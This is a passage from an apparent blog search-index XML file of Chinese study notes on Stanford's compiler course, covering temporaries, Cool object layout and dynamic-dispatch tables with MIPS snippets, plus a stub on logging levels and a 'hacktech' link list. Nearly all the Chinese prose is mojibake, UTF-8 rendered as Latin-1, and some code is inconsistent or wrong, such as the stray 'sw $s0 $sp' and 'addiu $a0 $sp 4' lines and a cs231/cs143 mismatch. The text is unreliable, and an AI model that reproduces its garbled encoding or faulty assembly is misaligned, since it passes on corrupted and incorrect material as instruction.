ebody)</code>ï¼Œå…¶ä¸­ï¼š</p><ul><li><code>Xi</code>æ˜¯å½¢å¼å‚æ•°</li><li><code>ebody</code>æ˜¯æ–¹æ³•ä½“(å‡½æ•°ä½“)</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514174645616.png"alt="image-20230514174645616" /><figcaption aria-hidden="true">image-20230514174645616</figcaption></figure><p><u>impl</u>æœ‰æ²¡æœ‰å¯èƒ½è·å–ä¸åˆ°æ–¹æ³•ï¼Ÿä¸å¯èƒ½ï¼Œå› ä¸ºç±»å‹æ£€æŸ¥ä»¥å·²ç»é€šè¿‡äº†ï¼Œå€˜è‹¥æ²¡æœ‰ç±»å‹æ£€æŸ¥ï¼Œè¿™ä¸€é˜¶æ®µä¼šæ›´å¤æ‚</p><p>å½“ç„¶ä¹Ÿæœ‰ä¸€äº›runtime errorç±»å‹æ£€æŸ¥æ£€æŸ¥ä¸åˆ°ï¼š</p><ul><li>A dispathc on void</li><li>Division by zero</li><li>Substring out of range</li><li>Heap overflow</li></ul><p>è¿™äº›å¼‚å¸¸æƒ…å½¢ä¸‹ï¼Œç¼–è¯‘å™¨å¿…é¡»æŠ›å‡ºé”™è¯¯ï¼Œå¹¶ä¸­æ–­ï¼Œè€Œä¸æ˜¯å´©æºƒ(not with asegfault)</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 8 Cool Object Layout</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯æ–¯å¦ç¦cs143ç¼–è¯‘åŸç†çš„ç¬”è®°ï¼Œå†…å®¹å¤§éƒ¨åˆ†æ¥è‡ªäºè¯¾ä»¶å’Œè‡ªå·±çš„ç†è§£ï¼Œç¬”è€…èƒ½åŠ›å’Œç²¾åŠ›æœ‰é™ï¼Œå¦‚æœæœ‰é”™è¯¯æ¬¢è¿æŒ‡å‡º</p><ul><li>Introduction to code gen</li><li>code gen 1</li><li>code gen 2</li></ul><h2 id="temporaries">Temporaries</h2><p>ä¹‹å‰ä»‹ç»çš„æ±‡ç¼–ä»£ç æ¯”å¦‚ä¸¤ä¸ªè¡¨è¾¾å¼ç›¸åŠ ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">a0</span> (<span class="hljs-number">0</span>)$<span class="hljs-built_in">sp</span><br>li $<span class="hljs-built_in">t0</span> ?<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">s0</span> $<span class="hljs-built_in">sp</span><br></code></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠå…¶ä¸­ä¸€ä¸ªåŠ æ•°æ”¾åœ¨äº†stacké‡Œï¼Œç„¶åå–å‡ºæ¥ï¼Œå†æŠŠè®¡ç®—çš„ä¸­é—´ç»“æœæ”¾åœ¨äº†stacké‡Œï¼Œè¿™å°±æ˜¯ä¸´æ—¶å˜é‡</p><p>æœ€æ™®é€šçš„<strong><code>å †æ ˆæœº</code></strong>éœ€è¦åœ¨å‡½æ•°æ ˆå¸§æš‚å­˜è¿™äº›ä¸´æ—¶å˜é‡ï¼ˆè™½ç„¶è¿™å¹¶ä¸é«˜æ•ˆï¼Œåé¢ä¼šè®²è§£å…³äºä¸´æ—¶å˜é‡åˆ†é…åˆ°å¯„å­˜å™¨çš„ç®—æ³•ï¼‰</p><p>è€ƒè™‘ä¸‹é¢ä»£ç ä½¿ç”¨äº†å¤šå°‘ä¸´æ—¶å˜é‡ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = <br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">1</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">0</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">2</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">1</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>) ==&gt; x-<span class="hljs-number">1</span>æ˜¯ä¸€ä¸ªï¼Œx-<span class="hljs-number">2</span>æ˜¯ä¸€ä¸ªï¼Œä¸¤å¼ç›¸åŠ ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥å…±ä¸¤ä¸ª<br><span class="hljs-attribute">fi</span><br><span class="hljs-attribute">fi</span><br></code></pre></td></tr></table></figure><p>å®šä¹‰NT(e)ä¸ºè¡¨è¾¾å¼eéœ€è¦å¤šå°‘ä¸ªä¸´æ—¶å˜é‡</p><p>å¯¹äºä¸€ä¸ªå‡½æ•°å®šä¹‰ï¼š<code>f(x1, ..., fn) = e</code>ï¼Œthe AR has<code>2 + NT(e)</code> elements:</p><ul><li>Return</li><li>Frame pointer</li><li>n arguments</li><li>NT(e)</li></ul><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„è§„åˆ™ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">NT(<span class="hljs-params">e1</span> + <span class="hljs-params">e2</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>)<br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e1</span>)</span><br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span><br>Of course, space used <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e1 can be reused <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e2<br><br><span class="hljs-constructor">NT(<span class="hljs-params">if</span> <span class="hljs-params">e1</span> = <span class="hljs-params">e2</span> <span class="hljs-params">then</span> <span class="hljs-params">e3</span> <span class="hljs-params">else</span> <span class="hljs-params">e4</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e3</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e4</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>(<span class="hljs-params">e1</span>, <span class="hljs-operator">...</span>, <span class="hljs-params">en</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, ..., <span class="hljs-constructor">NT(<span class="hljs-params">en</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">int</span>)</span> = <span class="hljs-number">0</span><br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>)</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰ä½¿ç”¨ä¸´æ—¶å˜é‡ä¹‹å‰ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> - <span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†ä¸´æ—¶å˜é‡ä¹‹åï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(e1 + e2, nt) = <br>cgen(e1, nt)<br>sw <span class="hljs-variable">$a0</span> nt(<span class="hljs-variable">$fp</span>) <span class="hljs-regexp">//</span> åœ¨åç§»é‡å¤„åšå‹å…¥æ ˆ<br><span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> - <span class="hljs-number">4</span> è¿™æ ·å°±ä¸ç”¨äº†é¢‘ç¹æ‰§è¡Œaddiuäº†<br>cgen(e2, nt + <span class="hljs-number">4</span>)<br>lw <span class="hljs-variable">$t1</span> nt(<span class="hljs-variable">$fp</span>)<br>add <span class="hljs-variable">$a0</span> <span class="hljs-variable">$t1</span> <span class="hljs-variable">$a0</span><br>  <span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$a0</span> <span class="hljs-variable">$sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h2 id="object-layout-and-dynamic-dispatch">Object Layout and dynamicdispatch</h2><p>OO(Objetc Oriented) Implementation = Basic code generation + morestuff(é¢å‘å¯¹è±¡çš„å®ç°å…¶å®å°±æ˜¯ä¹‹å‰æ‰€ä»‹ç»çš„åŸºæœ¬ä»£ç ç”Ÿæˆ+æœ¬æ¬¡è¦è®²çš„å†…å®¹)</p><p>OO Sloganï¼šå¦‚æœAæ˜¯Bçš„å­ç±»ï¼Œé‚£ä¹ˆBç±»å¯¹è±¡å¯ä»¥ç”¨äºä»»ä½•Aç±»çš„åœ°æ–¹ï¼š</p><p>eg:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> <span class="hljs-title">extends</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">f</span> <span class="hljs-params">(A a)</span> &#123;<br><br>&#125;<br><br>å‡½æ•°fçš„å…¥å‚å¯ä»¥æ˜¯AåŠå…¶å­ç±»<br></code></pre></td></tr></table></figure><p>è¿™å°±æ„å‘³ç€åœ¨ä»£ç ç”Ÿæˆçš„æ—¶å€™ï¼Œåœ¨å·²ç»ç”Ÿæˆå®Œäº†Aç±»çš„ä»£ç ï¼Œé‚£ä¹ˆBç±»(Açš„å­ç±»)å¯ä»¥ä¸ç”¨ä¿®æ”¹å…¶çˆ¶ç±»(A)çš„ä»£ç ï¼Œè€Œåªæ˜¯åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•ã€‚</p><p>å†ä»‹ç»å¯¹è±¡çš„ä»£ç ç”Ÿæˆä¹‹å‰ï¼Œéœ€è¦è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š</p><p><code>å¯¹è±¡åœ¨å“ªæ‘é‡Œå¦‚ä½•è¡¨ç¤ºï¼Ÿ</code></p><ul><li><p>Objects are laid out int contiguous memory;</p></li><li><p>Each attribute stored at a fixed offset in the object;</p></li><li><p>The attribute is in the same place in every object of thatclass;</p></li><li><p>When a method is invoked, the object is self and the fields arethe object's attributes;</p></li></ul><blockquote><p>ä¸ºä»€ä¹ˆå¯¹è±¡æ¯ä¸ªå±æ€§éƒ½æ˜¯å›ºå®šçš„åç§»é‡å‘¢ï¼Ÿè¿™è¦å½’ç»“äºåŒä¸€ä¸ªç±»å¯ä»¥newå¤šä¸ªå¯¹è±¡ï¼Œä½†è¿™äº›å¯¹è±¡çš„æ•°æ®å†…å­˜æ˜¯å„è‡ªç‹¬æœ‰çš„ï¼Œæ¯ä¸ªå¯¹è±¡åŒä¸€ä¸ªå±æ€§åœ¨å›ºå®šåç§»é‡çš„å†…å­˜å¤„ï¼Œæ–¹ä¾¿è·å–ï¼›è€Œæ–¹æ³•æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥æ–¹æ³•å•ç‹¬ç»´æŠ¤åœ¨äº†ä¸€å¼ methodstableä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½éƒ½æŒæœ‰æŒ‡å‘è¿™ä¸ªmethods tableçš„æŒ‡é’ˆdispatchpointerï¼Œä¸ç„¶ä¸åŒçš„å¯¹è±¡è¿˜è¦ç»´æŠ¤å„è‡ªçš„æ–¹æ³•ï¼Œè¿™æ ·å¤ªè´¹å†…å­˜äº†ã€‚</p></blockquote><p><code>å¦‚ä½•å®ç°åŠ¨æ€åˆ†é…?</code></p><p>Method table and dispatch ptr</p><p>å…³äºåŠ¨æ€åˆ†é…å’Œé™æ€åˆ†é…çš„æ¦‚å¿µï¼šhttps://lukasatkinson.de/2016/dynamic-vs-static-dispatch/</p><p>å…¶å®nodeé‡Œä¹Ÿæœ‰é™æ€åˆ†é…å’ŒåŠ¨æ€åˆ†é…çš„æ¦‚å¿µï¼š</p><p>wip</p><p><strong>é¦–å…ˆä»‹ç»ä¸‹å¯¹è±¡å¸ƒå±€</strong></p><p>è€ƒè™‘å¦‚ä¸‹ğŸŒ°ï¼Œä»¥ä¸‹å†…å®¹å‡å›´ç»•è¯¥ğŸŒ°å±•å¼€ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">A</span> &#123;<br><span class="hljs-selector-tag">a</span>: Int &lt;- <span class="hljs-number">0</span>;<br>d: Int &lt;- <span class="hljs-number">1</span>;<br>f(): Int &#123; <span class="hljs-selector-tag">a</span>&lt;- <span class="hljs-selector-tag">a</span> + d &#125;;<br>&#125;<br><br>class <span class="hljs-selector-tag">B</span> &#123;<br> <span class="hljs-selector-tag">b</span>: Int &lt;- <span class="hljs-number">2</span>;<br> f(): Int &#123; <span class="hljs-selector-tag">a</span> &#125;;<br> g(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- <span class="hljs-selector-tag">a</span> - <span class="hljs-selector-tag">b</span> &#125;;<br>&#125;<br><br>class C &#123;<br>c: Int &lt;- <span class="hljs-number">3</span>;<br>h(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- <span class="hljs-selector-tag">a</span> * c &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>cool objects layout: (ä¸‹é¢å†…å­˜æ˜¯è¿ç»­çš„)</p><table><thead><tr class="header"><th style="text-align: center;">Class tag(int) ç±»æ ‡è¯†ç¬¦</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Object size(int)</td></tr><tr class="even"><td style="text-align: center;">Dispatch ptr</td></tr><tr class="odd"><td style="text-align: center;">Attribute 1</td></tr><tr class="even"><td style="text-align: center;">Attribute 2</td></tr><tr class="odd"><td style="text-align: center;">...</td></tr></tbody></table><p>å…¶ä¸­å‰3ä¸ªç§°ä¸ºheader infomation</p><p>å…³äºç»§æ‰¿çš„å­ç±»çš„å†…å­˜å¸ƒå±€ï¼šè€ƒè™‘çˆ¶ç±»Aï¼Œå…¶å­ç±»Bå¯ä»¥é€šè¿‡åœ¨Aå¸ƒå±€ä¹‹ä¸Šè¿›è¡Œæ‰©å±•å¾—åˆ°ï¼Œå¦‚ä¸‹ï¼š</p><blockquote><p>B is an extensionï¼Œ just leaves the layout of A unchanged</p></blockquote><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th><th>8</th><th>12</th><th>16</th><th>20</th></tr></thead><tbody><tr class="odd"><td>A</td><td>Atag</td><td>5(word)</td><td>dispatch ptr1</td><td>a</td><td>d</td><td></td></tr><tr class="even"><td>B</td><td>Btag</td><td>6(word)</td><td>dispatch ptr2</td><td>a</td><td>d</td><td>b</td></tr><tr class="odd"><td>C</td><td>Ctag</td><td>6(word)</td><td>dispatch ptr3</td><td>a</td><td>d</td><td>c</td></tr></tbody></table><p>The offset for an attribute is the same in a class and all of itssubclass</p><p><strong>ä»‹ç»ä¸‹åŠ¨æ€åˆ†é…</strong></p><p>è€ƒè™‘e.f(), è¿™ä¸ªè¡¨è¾¾å¼eç”Ÿæˆä¹‹åï¼Œè¯¥å¦‚ä½•è°ƒç”¨å¯¹è±¡ä¸Šçš„æ–¹æ³•å‘¢ï¼Ÿ</p><p>å’Œå±æ€§å¸ƒå±€ä¸€æ ·ï¼Œå¯¹è±¡çš„æ–¹æ³•åŒæ ·åœ¨å†…å­˜ä¸Šæœ‰ç€å›ºå®šçš„åç§»é‡(åŒ…å«ç»§æ‰¿çš„æ–¹æ³•)ï¼Œåªä¸è¿‡è¿™äº›æ–¹æ³•æ˜¯å­˜åœ¨ä¸€å¼ dispatchtableé‡Œçš„(å…¶å®æˆ‘ä¸ªäººå–œæ¬¢ç§°ä¹‹ä¸ºmethodtable)ï¼Œè¿™å¼ è¡¨æä¾›äº†ç´¢å¼•è¿™äº›æ–¹æ³•çš„èƒ½åŠ›ï¼Œè¡¨é‡Œå­˜å‚¨çš„æ˜¯å‡½æ•°åœ°å€ï¼Œå¦‚ï¼Œæ–¹æ³•få°±æ˜¯åœ¨å…¶é™„å±ç±»çš„è¡¨é‡Œçš„å›ºå®šåç§»é‡å¤„ï¼Œå½“ç„¶åœ¨å…¶å­ç±»ä¹Ÿæ˜¯åŒæ ·çš„åç§»é‡ï¼›</p><p>ä¸ºä»€ä¹ˆåŒä¸€æ–¹æ³•åœ¨ç±»å’Œå…¶å­ç±»ä¸­è®¾è®¡æˆå›ºå®šçš„åç§»é‡å‘¢ï¼Ÿwip</p><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th></tr></thead><tbody><tr class="odd"><td>A</td><td>fa</td><td></td></tr><tr class="even"><td>B</td><td>fb</td><td>g</td></tr><tr class="odd"><td>C</td><td>fa</td><td>h</td></tr></tbody></table><p>æ³¨ï¼šå¦‚æœfaä¸­æµ·å®šä¹‰äº†å…¶ä»–æ–¹æ³•ï¼Œåˆ™å¯ä»¥</p><p>ç±»çš„æ¯ä¸ªæ–¹æ³•féƒ½åœ¨ç¼–è¯‘æœŸè¢«åˆ†é…åœ¨dispatch tableçš„å›ºå®šåç§»é‡O_få¤„ï¼Œæ¢å¥è¯è¯´ï¼Œç¼–è¯‘å™¨çš„å·¥ä½œå°±æ˜¯æ‰¾å‡ºç±»çš„æ‰€æœ‰æ–¹æ³•ç„¶åç»™æ¯ä¸ªæ–¹æ³•åˆ†æ´¾ä¸€ä¸ªå›ºå®šçš„ä½ç½®ã€‚</p><p>ç»¼ä¸Šï¼Œä¸ºäº†å®ç°dynamic dispatch<code>e.f()</code>ï¼Œç¼–è¯‘å™¨åº”è¯¥èµ°ä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ol type="1"><li>è¯„ä¼°è¡¨è¾¾å¼eï¼Œå¾—åˆ°ä¸€ä¸ªå¯¹è±¡xï¼›</li><li>call <code>D[Of]</code><ul><li>D is the disptatch table for x</li><li>in the call ,self is bound to x</li></ul></li></ol><h2 id="æ€»ç»“">æ€»ç»“</h2><p>åœ¨å­¦ä¹ å®Œä¹‹åï¼Œæˆ‘ä»¬è€ƒè™‘ä¸‹å¦‚æœæ˜¯æˆ‘ä»¬è¯¥å¦‚ä½•ä¸ºä»¥ä¸‹ä»£ç è®¾è®¡ä»£ç ç”Ÿæˆ</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>a: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">1</span>;<br>f(): <span class="hljs-type">Int</span> &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">1</span>) &#125;;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>b: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">10</span>;<br>g(): int &#123; b;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>m: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">2</span>;<br>f(): int &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">2</span>)&#125;;<br>&#125;<br><br>b: <span class="hljs-type">B</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>();<br>b.g();<br><br>c: <span class="hljs-type">C</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">C</span>();<br>c.f();<br></code></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">è¯„ä¼°b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new B();</span><br><span class="hljs-attribute">åˆå§‹åŒ–</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table1</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">10</span><br><br><span class="hljs-attribute">dispath table1</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><span class="hljs-attribute">g</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__g</span><br><br><br><span class="hljs-attribute">dispath table1</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><br><span class="hljs-attribute">è¯„ä¼°c</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new C();</span><br><span class="hljs-attribute">åˆå§‹åŒ–c</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table2</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">m</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><br><br><span class="hljs-attribute">dispath table2</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><br>b.g();<br>è·å–bå¯¹è±¡çš„dispatch table1<br>æ‹¿åˆ°gæ–¹æ³•<br>è°ƒç”¨å³å¯<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>debug</title>
    <link href="/emocoder/2023/05/07/debug/"/>
    <url>/emocoder/2023/05/07/debug/</url>
    
    <content type="html"><![CDATA[<h2 id="æ—¥å¿—å·¥å…·">æ—¥å¿—å·¥å…·</h2><p>å¼€å‘è€…ä½¿ç”¨ï¼š traceï¼šæ‰“å°è°ƒç”¨å †æ ˆdebugï¼šä¸ä»…æ‰“å°è°ƒç”¨å †æ ˆï¼Œè¿˜æ‰“å°å˜é‡ä¿¡æ¯</p><p>ç”¨æˆ·ä½¿ç”¨ï¼š info warnï¼šåªæ˜¯è­¦å‘Šï¼Œä½†æ˜¯ä¸å½±å“è¿è¡Œerrorï¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ç»§ç»­è¿è¡Œ fatal:ä¸­æ–­æ•´ä¸ªåº”ç”¨ç¨‹åºçš„æ‰§è¡Œ</p><p>é¦–å…ˆ</p>]]></content>
    
    
    <categories>
      
      <category>å‰ç«¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å‰ç«¯ï¼Œnodeï¼Œè°ƒè¯•ï¼Œdebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacktech</title>
    <link href="/emocoder/2023/05/06/hacktech/"/>
    <url>/emocoder/2023/05/06/hacktech/</url>
    
    <content type="html"><![CDATA[<p>å†…ç½‘æ¸—é€+çˆ†ç ´ï¼šhttps://blog.csdn.net/m0_46684679/article/details/117854834</p><p>å®‰å…¨é›†é”¦ï¼šhttps://www.zhihu.com/column/c_1334810805263515648</p><p>ç½‘ç»œé˜²ç«å¢™ï¼šhttps://zhuanlan.zhihu.com/p/159088465</p><p>æ ¼å¼: echo -e "\033[å­—èƒŒæ™¯é¢œè‰²;å­—ä½“é¢œè‰²må­—ç¬¦ä¸²\033[0m"</p><p>-eå¯¹ç‰¹æ®Šå­—ç¬¦åšè½¬ä¹‰</p><p>eg: echo -e "\033[41;36m something here \033[0m"</p><p>å…¶ä¸­41çš„ä½ç½®ä»£è¡¨åº•è‰², 36çš„ä½ç½®æ˜¯ä»£è¡¨å­—çš„é¢œè‰²</p><p>æ­£åˆ™é€šé…ç¬¦å’Œlinuxé€šé…ç¬¦æ˜¯ä¸ä¸€æ 